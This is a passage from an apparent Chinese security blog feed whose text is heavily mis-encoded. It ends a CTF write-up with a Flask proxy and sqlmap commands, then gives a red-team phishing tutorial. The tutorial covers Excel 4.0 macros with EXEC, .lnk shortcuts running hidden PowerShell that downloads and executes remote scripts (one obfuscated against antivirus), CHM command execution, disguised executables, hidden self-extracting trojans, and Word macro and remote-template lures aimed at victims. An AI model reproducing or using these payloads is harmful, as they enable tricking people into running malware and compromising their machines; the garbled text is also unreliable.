&quot;mg&quot;, &quot;è½&quot;: &quot;mw&quot;, &quot;éš†&quot;: &quot;nA&quot;,</span><br><span class="line">     &quot;å„&quot;: &quot;nQ&quot;, &quot;æ‹¢&quot;: &quot;ng&quot;, &quot;é™‡&quot;: &quot;nw&quot;, &quot;æ¥¼&quot;: &quot;oA&quot;, &quot;å¨„&quot;: &quot;oQ&quot;, &quot;æ‚&quot;: &quot;og&quot;, &quot;ç¯“&quot;: &quot;ow&quot;, &quot;æ¼&quot;: &quot;pA&quot;, &quot;é™‹&quot;: &quot;pQ&quot;, &quot;èŠ¦&quot;: &quot;pg&quot;,</span><br><span class="line">     &quot;å¢&quot;: &quot;pw&quot;, &quot;é¢…&quot;: &quot;qA&quot;, &quot;åº&quot;: &quot;qQ&quot;, &quot;ç‚‰&quot;: &quot;qg&quot;, &quot;æ³&quot;: &quot;qw&quot;, &quot;å¤&quot;: &quot;rA&quot;, &quot;è™&quot;: &quot;rQ&quot;, &quot;é²&quot;: &quot;rg&quot;, &quot;éº“&quot;: &quot;rw&quot;, &quot;ç¢Œ&quot;: &quot;sA&quot;,</span><br><span class="line">     &quot;éœ²&quot;: &quot;sQ&quot;, &quot;è·¯&quot;: &quot;sg&quot;, &quot;èµ‚&quot;: &quot;sw&quot;, &quot;é¹¿&quot;: &quot;tA&quot;, &quot;æ½&quot;: &quot;tQ&quot;, &quot;ç¦„&quot;: &quot;tg&quot;, &quot;å½•&quot;: &quot;tw&quot;, &quot;é™†&quot;: &quot;uA&quot;, &quot;æˆ®&quot;: &quot;uQ&quot;, &quot;é©´&quot;: &quot;ug&quot;,</span><br><span class="line">     &quot;è„Œ&quot;: &quot;uw&quot;, &quot;è„•&quot;: &quot;vA&quot;, &quot;è„—&quot;: &quot;vQ&quot;, &quot;è„™&quot;: &quot;vg&quot;, &quot;è„›&quot;: &quot;vw&quot;, &quot;è„œ&quot;: &quot;wA&quot;, &quot;è„&quot;: &quot;wQ&quot;, &quot;è„Ÿ&quot;: &quot;wg&quot;, &quot;è„ &quot;: &quot;ww&quot;, &quot;è„¡&quot;: &quot;xA&quot;,</span><br><span class="line">     &quot;è„¢&quot;: &quot;xQ&quot;, &quot;è„£&quot;: &quot;xg&quot;, &quot;è„¤&quot;: &quot;xw&quot;, &quot;è„¥&quot;: &quot;yA&quot;, &quot;è„¦&quot;: &quot;yQ&quot;, &quot;è„§&quot;: &quot;yg&quot;, &quot;è„¨&quot;: &quot;yw&quot;, &quot;è„©&quot;: &quot;zA&quot;, &quot;è„ª&quot;: &quot;zQ&quot;, &quot;è„«&quot;: &quot;zg&quot;,</span><br><span class="line">     &quot;è„­&quot;: &quot;zw&quot;, &quot;è„®&quot;: &quot;0A&quot;, &quot;è„°&quot;: &quot;0Q&quot;, &quot;è„³&quot;: &quot;0g&quot;, &quot;è„´&quot;: &quot;0w&quot;, &quot;è„µ&quot;: &quot;1A&quot;, &quot;è„·&quot;: &quot;1Q&quot;, &quot;è„¹&quot;: &quot;1g&quot;, &quot;è„º&quot;: &quot;1w&quot;, &quot;è„»&quot;: &quot;2A&quot;,</span><br><span class="line">     &quot;è„¼&quot;: &quot;2Q&quot;, &quot;è„½&quot;: &quot;2g&quot;, &quot;è„¿&quot;: &quot;2w&quot;, &quot;è°©&quot;: &quot;3A&quot;, &quot;èŠ’&quot;: &quot;3Q&quot;, &quot;èŒ«&quot;: &quot;3g&quot;, &quot;ç›²&quot;: &quot;3w&quot;, &quot;æ°“&quot;: &quot;4A&quot;, &quot;å¿™&quot;: &quot;4Q&quot;, &quot;è½&quot;: &quot;4g&quot;,</span><br><span class="line">     &quot;çŒ«&quot;: &quot;4w&quot;, &quot;èŒ…&quot;: &quot;5A&quot;, &quot;é”š&quot;: &quot;5Q&quot;, &quot;æ¯›&quot;: &quot;5g&quot;, &quot;çŸ›&quot;: &quot;5w&quot;, &quot;é“†&quot;: &quot;6A&quot;, &quot;å¯&quot;: &quot;6Q&quot;, &quot;èŒ‚&quot;: &quot;6g&quot;, &quot;å†’&quot;: &quot;6w&quot;, &quot;å¸½&quot;: &quot;7A&quot;,</span><br><span class="line">     &quot;è²Œ&quot;: &quot;7Q&quot;, &quot;è´¸&quot;: &quot;7g&quot;, &quot;ä¹ˆ&quot;: &quot;7w&quot;, &quot;ç«&quot;: &quot;8A&quot;, &quot;æš&quot;: &quot;8Q&quot;, &quot;æ¢…&quot;: &quot;8g&quot;, &quot;é…¶&quot;: &quot;8w&quot;, &quot;éœ‰&quot;: &quot;9A&quot;, &quot;ç…¤&quot;: &quot;9Q&quot;, &quot;æ²¡&quot;: &quot;9g&quot;,</span><br><span class="line">     &quot;çœ‰&quot;: &quot;9w&quot;&#125;</span><br><span class="line">def encode(s):</span><br><span class="line">    s&#x3D;str(s)</span><br><span class="line">    res &#x3D; &#39;&#39;</span><br><span class="line">    for i in s:</span><br><span class="line">        res +&#x3D; a[i]</span><br><span class="line">    return res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#39;&#x2F;&#39;)</span><br><span class="line">def hello_world():</span><br><span class="line">    id&#x3D;encode(request.args.get(&#39;id&#39;))</span><br><span class="line">    url&#x3D;&#39;http:&#x2F;&#x2F;106.55.249.213:5001&#x2F;?user&#x3D;XAXwaAZAaQ&amp;id&#x3D;&#39;+id</span><br><span class="line">    return requests.get(url&#x3D;url).text</span><br><span class="line"></span><br><span class="line">app.run(debug&#x3D;True,port&#x3D;3389)</span><br></pre></td></tr></table></figure><p>å…ˆæœ¬åœ°è·‘ä¸‹flaskè„šæœ¬</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 harvey.py</span><br></pre></td></tr></table></figure><p>æ¥ç€å°±æ˜¯sqlmapæŸ¥ä¸‹è¡¨å°±èƒ½å¾—åˆ°flagï¼šflag{SXC is very funny!}</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http:&#x2F;&#x2F;127.0.0.1:3389?id&#x3D;1</span><br><span class="line">python sqlmap.py -u http:&#x2F;&#x2F;127.0.0.1:3389?id&#x3D;1 --dump p id</span><br></pre></td></tr></table></figure><p>PSï¼šè‰¹ï¼Œæˆ‘è¿™kali2020çš„sqlmapæ˜¯å‡çš„ï¼Œè·‘äº†åå‡ åˆ†é’Ÿç»“æœæ²¡è·‘å‡ºäº†<br><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3592519063.png"></p><p><a href="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/SXCTFHarvey.mp4">https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/SXCTFHarvey.mp4</a></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SXCCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>çº¢é˜ŸæŠ€å·§-ç½‘ç»œé’“é±¼</title>
      <link href="2021/02/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E5%B7%A7-%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC/"/>
      <url>2021/02/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E5%B7%A7-%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC/</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æ¶µç›–äº†ç°åœ¨å¤§å¤šæ•°çº¢é˜Ÿé’“é±¼çš„æ‰‹æ³•ï¼Œä¸€ç›´ä»¥æ¥é’“é±¼é…åˆå…æ€ï¼Œæ›´èƒ½å‡ºå¥‡åˆ¶èƒœï¼</p><h2 id="1-excelå®æ‰§è¡Œä»»æ„å‘½ä»¤"><a href="#1-excelå®æ‰§è¡Œä»»æ„å‘½ä»¤" class="headerlink" title="1. excelå®æ‰§è¡Œä»»æ„å‘½ä»¤"></a>1. excelå®æ‰§è¡Œä»»æ„å‘½ä»¤</h2><p>æ–°å»ºä¸€ä¸ªexelè¡¨ï¼Œç„¶åæ‰“å¼€ï¼Œå¯¹å‡†è¿™ä¸ªå³é”®ç‚¹å‡»æ’å…¥å®ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/614473386.png"></p><p>ç„¶ååœ¨ç¬¬ä¸€åˆ‡æ¢åˆ°å®ï¼Œå¤åˆ¶ç²˜è´´å¦‚ä¸‹è¯­å¥ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x3D;EXEC(&quot;notepad&quot;)</span><br><span class="line">&#x3D;HALT()</span><br></pre></td></tr></table></figure><p>å¿…é¡»å¸¦=HALT()ï¼Œä¸ç„¶è™½ç„¶å‘½ä»¤æ‰§è¡Œäº†ï¼Œä½†ä¼šæŠ¥é”™ï¼Œå®¹æ˜“éœ²é¦…ï¼<br>ç„¶åæµ‹è¯•ä¸€ä¸‹ï¼Œé€‰ä¸­è¯­å¥ï¼Œå³é”®ï¼Œç‚¹å‡»æ‰§è¡Œï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/838700290.png"></p><p>å°±ä¼šå¼¹å‡ºnotepadï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1721636292.png"></p><p>é€šè¿‡msfç”Ÿæˆmsiæ–‡ä»¶ï¼Œpythonå¼€å¯httpæœåŠ¡ï¼Œç„¶åæ›¿æ¢å‘½ä»¤ä¸ºæ”»å‡»è½½è·ï¼Œå³é”®éšè—å®ï¼Œå¹¶æŠŠæ–‡ä»¶æ‰§è¡Œæ–¹å¼æ”¹ä¸º<br>Auto_openï¼Œç›´æ¥å¤åˆ¶ç²˜è´´ï¼ŒæŒ‰ä¸€ä¸‹enterå°±è¡Œäº†</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2435505759.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2732847508.png"></p><p>ç„¶åå¦å­˜ï¼Œ2016ç‰ˆæœ¬è®°å¾—ç‚¹å‡»å¦ï¼Œç„¶åå¾—é€‰æ‹©ä¸€ä¸ªå¯ç”¨å®çš„æ–‡ä»¶ï¼Œè¿œæ–¹æœåŠ¡å™¨ç›‘å¬ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3099217363.png"></p><p>å°±æ¬§å…‹äº†ï¼Œå½“ç„¶è¿™é‡Œè‚¯å®šä¸æ­¢è¿™ä¸ªmsiæ–‡ä»¶ï¼Œéƒ½èƒ½æ‰§è¡Œå‘½ä»¤äº†ï¼Œè¯¥æ€ä¹ˆåˆ©ç”¨ï¼Œä½ æ‡‚çš„ï¼</p><h2 id="2-Linké’“é±¼ï¼š"><a href="#2-Linké’“é±¼ï¼š" class="headerlink" title="2 Linké’“é±¼ï¼š"></a>2 Linké’“é±¼ï¼š</h2><p>éšä¾¿é€‰æ‹©ä¸€ä¸ªåº”ç”¨æˆ–è€…æ–‡ä»¶ï¼Œå³é”®ç‚¹å‡»åˆ›å»ºå¿«æ·æ–¹å¼ï¼Œå³é”®æ‰“å¼€å±æ€§ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1838770605.png"></p><p>æˆ‘ä»¬éœ€è¦æ›´æ”¹ç›®æ ‡è¿™é‡Œçš„ç›®æ ‡ï¼Œè¿™é‡Œçš„ç›®æ ‡è·¯å¾„æ”¹æˆæˆ‘ä»¬çš„æ”»å‡»è½½è·ï¼Œä¸‹é¢çš„èµ·å§‹ä½ç½®å¯ä»¥ä¸æ›´æ”¹ï¼ŒåŸºæœ¬ä¸Šæ²¡å•¥å½±å“ã€‚<br>ä¿®æ”¹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\cmd.exe &#x2F;c powershell -nop -w hidden -exec bypass - -c &quot;IEX((New-Object System.Net.WebClient).DownloadString(&#39;&#x2F;&#x2F;192.168.1.109&#x2F;1.ps1&#39;))</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3845327971.png"></p><p>é€‰æ‹©æ›´æ”¹å›¾æ ‡ï¼Œå› ä¸ºæˆ‘è¿™é‡Œæ”¹æˆäº†cmdï¼Œå¿«æ·æ–¹å¼å¯¹åº”çš„å›¾æ ‡ä¹Ÿä¼šæ›´æ”¹ä¸ºcmdï¼Œéœ€è¦æ›´æ”¹ä¸€ä¸‹å›¾æ ‡ï¼ŒæŸ¥æ‰¾å›¾æ ‡è·¯å¾„æ”¹æˆshell32.dll è¿™é‡Œå­˜æ”¾è¿™windowsç³»ç»Ÿæ‰€ä»¥çš„å›¾æ ‡ï¼Œä¸å»ºè®®å»è‡ªå·±åŠ ï¼Œå› ä¸ºä½ è¦å‘é€ç»™å—å®³è€…ï¼Œä¸èƒ½ä¿è¯å—å®³è€…ç”µè„‘ä¸Šæœ‰æ­¤å›¾æ ‡</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1263613379.png"></p><p>ç„¶åå†æ”¹ä¸€ä¸‹å¿«æ·æ–¹å¼åå­—ï¼Œæ¯”å¦‚åƒæˆ‘è¿™æ ·ï¼Œå¿…é¡»å¾—è¯±äººä¸€ç‚¹ï¼</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3755953818.png"></p><p>é‚£ä¹ˆä¸€ä¸ªlink é’“é±¼å°±å®Œæˆäº†ï¼Œä½†æ˜¯è¿™ä¸ªæ”¾å‡ºå»æ€è½¯ç«‹é©¬å¹²æ­»ï¼Œå¥½äººåšåˆ°åº•ï¼Œå†æ¥ä¸ªè¿‡é™æ€çš„å…æ€è¯­å¥æ··æ·†ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd.exe &#x2F;c &quot;FOR &#x2F;F &quot;delims&#x3D;s\ tokens&#x3D;4&quot; %a IN (&#39;set^|findstr PSM&#39;)DO %a IEX (New-ObjectNet.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;bit.ly&#x2F;L3g1t&#39;)&quot;</span><br></pre></td></tr></table></figure><h2 id="3-CHMæ–‡æ¡£é’“é±¼ï¼š"><a href="#3-CHMæ–‡æ¡£é’“é±¼ï¼š" class="headerlink" title="3 CHMæ–‡æ¡£é’“é±¼ï¼š"></a>3 CHMæ–‡æ¡£é’“é±¼ï¼š</h2><p>æ–°å»ºä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œæ–°å»ºä¸€ä¸ªindex.htmlï¼Œæ–‡ä»¶å†…å®¹ä¸º</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Mousejack replay&lt;&#x2F;title&gt;&lt;head&gt;&lt;&#x2F;head&gt;&lt;body&gt;</span><br><span class="line">command exec</span><br><span class="line">&lt;OBJECT id&#x3D;x classid&#x3D;&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot; width&#x3D;1 height&#x3D;1&gt;</span><br><span class="line">&lt;PARAM name&#x3D;&quot;Command&quot; value&#x3D;&quot;ShortCut&quot;&gt;</span><br><span class="line"> &lt;PARAM name&#x3D;&quot;Button&quot; value&#x3D;&quot;Bitmap::shortcut&quot;&gt;</span><br><span class="line"> &lt;PARAM name&#x3D;&quot;Item1&quot; value&#x3D;&#39;,calc.exe&#39;&gt;</span><br><span class="line"> &lt;PARAM name&#x3D;&quot;Item2&quot; value&#x3D;&quot;273,1,1&quot;&gt;</span><br><span class="line">&lt;&#x2F;OBJECT&gt;</span><br><span class="line">&lt;SCRIPT&gt;</span><br><span class="line">x.Click();</span><br><span class="line">&lt;&#x2F;SCRIPT&gt;</span><br><span class="line">&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1282025123.png"></p><p>ç„¶åæ‰“å¼€Easy CHMç¨‹åºï¼Œæ–°å»ºï¼Œæµè§ˆï¼Œé€‰æ‹©æˆ‘ä»¬å»ºç«‹å¥½çš„ç›®å½•ï¼Œç„¶åç¡®å®šï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3242885363.png"></p><p>ç„¶åç‚¹å‡»ç¼–è¯‘ï¼Œç„¶åå°±ä¼šç”Ÿæˆä¸€ä¸ªchmæ–‡æ¡£</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2384073694.png"></p><p>é‚£ä¹ˆæˆ‘ä»¬è¿™é‡Œåªéœ€è¦æ‰“å¼€è¿™ä¸ªæ–‡ä»¶ï¼Œå°±ä¼šæ‰§è¡Œé‡Œé¢çš„å‘½ä»¤</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2654194455.png"></p><p>ä»ä»£ç ä¸Šæ¥çœ‹ï¼Œchmæ–‡ä»¶æ˜¯å¯ä»¥æ‰§è¡Œjsä»£ç çš„ï¼Œé‚£ä¹ˆå°±å¯ä»¥é…åˆjsbackdoor æ¥è¿›è¡Œæƒé™è·å–ï¼Œè¿™é‡Œæ¨èä¸€ä¸ªé¡¹ç›®ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Ridter&#x2F;MyJSRat</span><br></pre></td></tr></table></figure><p>ä¸€ä¸ªpyç‰ˆæœ¬çš„JSbackdoor</p><h2 id="4-æ–‡ä»¶é’“é±¼"><a href="#4-æ–‡ä»¶é’“é±¼" class="headerlink" title="4.æ–‡ä»¶é’“é±¼"></a>4.æ–‡ä»¶é’“é±¼</h2><p>é’“é±¼æ–¹å¼çš„å¼€å±±é¼»ç¥–ï¼Œå¾ˆå¤è€äº†ï¼ŒåŸç†å°±æ˜¯åˆ©ç”¨ä¸€èˆ¬äººæ˜¯ä¸ä¼šæ‰“å¼€æ˜¾ç¤ºå·²çŸ¥çš„æ–‡ä»¶æ‰©å±•åï¼Œè€Œwindowsæ­£å¸¸æƒ…å†µä¸‹ä¸ä¼šæ˜¾ç¤ºå·²çŸ¥çš„æ–‡ä»¶æ‰©å±•åï¼Œä½†æ˜¯ä»äº‹ä¿¡æ¯å®‰å…¨çš„äººå‘˜ä¸€èˆ¬éƒ½æ‰“å¼€äº†çš„ã€‚<br>è¿™é‡Œåˆ¶ä½œä¹ŸæŒºç®€å•çš„ï¼Œåªéœ€è¦æ›´æ¢ä¸€ä¸ªå›¾æ ‡å°±è¡Œï¼Œè¿™é‡Œå…ˆç”¨cséšä¾¿ç”Ÿæˆä¸€ä¸ªexe</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/184609184.png"></p><p>ç„¶åæˆ‘æŠŠæ˜¾ç¤ºå·²çŸ¥çš„æ–‡ä»¶æ‰©å±•åå…³æ‰<br>é¦–å…ˆæŠŠexeæ–‡ä»¶æ‹–åˆ°resource hackeré‡Œï¼ŒæˆåŠŸåé¢æ˜¾ç¤ºæ–‡ä»¶åï¼Œç„¶åç‚¹å‡»å¢åŠ ä¸€ä¸ªèµ„æº</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2998470057.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/502940224.png"></p><p>ç„¶åé€‰æ‹©icoå›¾æ ‡</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1130113496.png"></p><p>ç„¶åç‚¹å‡»ä¿å­˜å³å¯</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/209030690.png"></p><p>é‚£ä¹ˆå°±æˆäº†é¸­ï¼</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1861199677.png"></p><h2 id="5-è‡ªè§£å‹é’“é±¼"><a href="#5-è‡ªè§£å‹é’“é±¼" class="headerlink" title="5. è‡ªè§£å‹é’“é±¼"></a>5. è‡ªè§£å‹é’“é±¼</h2><p>æˆ‘è¿™é‡Œå°±ç”¨åˆšåˆšæ”¹å¥½çš„æœ¨é©¬äº†ï¼Œåˆ›å»ºè‡ªè§£å‹æ–‡ä»¶ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1649302444.png"></p><p>ç‚¹å‡»é«˜çº§ï¼Œè‡ªè§£å‹é€‰é¡¹ï¼Œå¸¸è§„ï¼Œè®¾ç½®è‡ªè§£å‹è·¯å¾„</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4042454625.png"></p><p>ç‚¹å‡»è®¾ç½®ï¼Œè®¾ç½®è§£å‹åè¿è¡Œæ–‡ä»¶çš„è·¯å¾„</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1514118443.png"></p><p>æ¨¡å¼é€‰æ‹©å…¨éƒ¨éšè—</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1464487603.png"></p><p>æ›´æ–°è®¾ç½®æˆè¦†ç›–æ‰€æœ‰æ–‡ä»¶ï¼Œä¿è¯äºŒæ¬¡è‡ªè§£å‹ä¸æŠ¥é”™ï¼Œä¸ä¼šå¼•èµ·æ€€ç–‘</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2174829634.png"></p><p>ç„¶åä¿®æ”¹æ–‡ä»¶åå’Œå›¾æ ‡è¿›è¡Œä¼ªè£…å°±æ¬§å…‹äº†</p><h2 id="6-wordå®é’“é±¼"><a href="#6-wordå®é’“é±¼" class="headerlink" title="6.wordå®é’“é±¼"></a>6.wordå®é’“é±¼</h2><p>æ–°å»ºä¸€ä¸ªwordï¼Œæ‰“å¼€ï¼Œç„¶åç‚¹å‡»è§†å›¾ï¼Œå®ï¼ŒæŸ¥çœ‹å®ï¼Œé€‰æ‹©å½“å‰æ–‡æ¡£ï¼Œç‚¹å‡»åˆ›å»º</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1840227932.png"></p><p>ç„¶åcsç”Ÿæˆå®ä»£ç ï¼Œå¤åˆ¶ç²˜è´´è¿›å»</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2252918189.png"></p><p>ç„¶åå¦å­˜ä¸ºdocmæ–‡æ¡£ï¼Ÿä½ ä»¥ä¸ºå°±è¿™æ ·ï¼Ÿ<br>NOï¼Œå’±ä»¬ç©éªšä¸€ç‚¹ï¼Œæˆ‘åœ¨ç½‘ä¸Šéšä¾¿æ‰¾äº†ä¸ªæ¨¡æ¿å¤åˆ¶ç²˜è´´è¿›å»ï¼Œç„¶åæˆªå›¾ï¼Œå¦å­˜ä¸º</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1085757848.png"></p><p>æ‰“å¼€æˆ‘ä»¬çš„ç¥å™¨ï¼Œç¾å›¾ç§€ç§€ï¼Œæ‰“å¼€æˆ‘ä»¬åˆšæˆªå›¾çš„å›¾ç‰‡ï¼Œç‚¹å‡»èƒŒæ™¯è™šæ‹ŸåŒ–ï¼Œè°ƒæ•´è™šæ‹ŸåŒ–ç¨‹åº¦ï¼Œæœ€å¥½æ˜¯é‚£ç§å¼±å½±å¼±ç°çš„æ„Ÿè§‰æœ€niceï¼Œç„¶ååŠ ä¸Šä¸€äº›è¯´æ˜å—·</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2867927300.png"></p><p>ç„¶åè®¾ç½®å›¾ç‰‡å°ºå¯¸ä¸º790ï¼Œ1120</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1489980378.png"></p><p>ç„¶åä¿å­˜ï¼Œç„¶åå°±å¯ä»¥çœ‹åˆ°æ•ˆæœäº†</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2287836159.png"></p><p>ä¸ºä»€ä¹ˆä¼šè®¾ç½®æˆ790x1120å˜ï¼Œåªæ˜¯ä¸ºäº†åˆšå¥½è¦†ç›–wordé‡Œé¢çš„æ–‡æœ¬ï¼Œç„¶ådocxæ–‡æ¡£å¦å­˜ä¸ºdocæ–‡æ¡£<br>ç„¶åæ‰“å¼€ï¼Œå»å¼€å¯æ˜¾ç¤ºå¼€å‘è€…å·¥å…·é€‰é¡¹å¡ï¼Œæ–‡ä»¶-&gt;é€‰é¡¹-&gt;è‡ªå®šä¹‰åŠŸèƒ½åŒº-&gt;ä¸»é€‰é¡¹å¡-&gt;å¼€å‘è€…å·¥å…·</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2389974620.png"></p><p>ç„¶åç‚¹å‡»å¼€å‘è€…å·¥å…·ï¼Œé€‰æ‹©å›¾åƒï¼ˆActiveæ§ä»¶ï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1473113620.png"></p><p>è®¾ç½®å›¾åƒæ ¼å¼ä¸ºæµ®äºæ–‡å­—ä¸Šæ–¹ï¼Œå¹¶æŠŠå›¾åƒæ‹‰æ»¡</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/444250869.png"></p><p>æ•ˆæœå°±æ˜¯è¿™æ ·ï¼Œä¼šæŠŠæ–‡å­—å…¨éƒ¨è¦†ç›–</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3233189288.png"></p><p>ç„¶åç‚¹å‡»å›¾åƒå±æ€§ï¼Œè®¾ç½®æˆæˆ‘ä»¬åšå¥½çš„å›¾ç‰‡ï¼Œç„¶åç‚¹å‡»å®åˆ›å»ºå®ï¼Œcsç”Ÿæˆå®æœ¨é©¬</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3388623595.png"></p><p>å¤åˆ¶ç²˜è´´ï¼Œåœ¨Auto_Openï¼ˆï¼‰å‡½æ•°é¦–éƒ¨ç¼–å†™ä»£ç ï¼Œè®¾ç½®å›¾ç‰‡ä½ç½®ä¸º0é«˜åº¦ä¸º0è®©å®è¿è¡Œådocä¸Šå›¾ç‰‡æ¶ˆå¤±ï¼Œç„¶åä¿å­˜ï¼Œofficeé©¬å°±åˆ¶ä½œå¥½äº†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Project.ThisDocument.Image1.Top &#x3D; 0</span><br><span class="line">Project.ThisDocument.Image1.Width &#x3D; 0</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2809499787.png"></p><p>æˆå“å±•ç¤ºï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/853217052.png"></p><p>é‚£ä¹ˆç‚¹å‡»å¯ç”¨å®ï¼Œå›¾ç‰‡å°±å¥½æ¶ˆå¤±ï¼Œæ˜¾ç¤ºå‡ºæ­£å¸¸çš„æ–‡ä»¶æ¥ã€‚<br>è¿˜æœ‰ä¸€ç§æ˜¯è¿œç¨‹åŠ è½½çš„æ–¹å¼ï¼Œå…ˆåˆ›å»ºä¸€ä¸ªå¸¦æœ‰å®æœ¨é©¬çš„æ–‡æ¡£å¦å­˜ä¸ºdotmåç¼€å½“æˆæ¨¡æ¿ï¼Œæ”¾åœ¨è¿œç¨‹æœåŠ¡å™¨ä¸Šï¼Œå¼€å¯httpæœåŠ¡ï¼Œç„¶åå†æ–°å»ºä¸€ä¸ªæ¨¡æ¿wordï¼Œæ”¹åç¼€æ”¹æˆzipï¼Œç„¶åè§£å‹ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3123339568.png"></p><p>ç„¶åæ‰¾åˆ°è¿™ä¸ªæ–‡ä»¶settings.xml.relsï¼Œç¼–è¾‘</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3350739493.png"></p><p>æ›¿æ¢æˆæˆ‘ä»¬è¿œç¨‹çš„å®æœ¨é©¬æ–‡ä»¶çš„é“¾æ¥ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3412552913.png"></p><p>ç„¶åå†æŠŠå®ƒå‹ç¼©äº†ï¼Œæ–‡ä»¶åç¼€åˆæ”¹å›æˆdocxï¼Œé‚£ä¹ˆå°±æˆäº†ï¼Œè¿™ç§å…æ€æ•ˆæœè¦å¥½ä¸€ç‚¹ï¼Œè¿œç¨‹åŠ è½½å˜›ã€‚</p><h2 id="7-ä¼ªé€ ç½‘ç«™é’“é±¼"><a href="#7-ä¼ªé€ ç½‘ç«™é’“é±¼" class="headerlink" title="7.ä¼ªé€ ç½‘ç«™é’“é±¼"></a>7.ä¼ªé€ 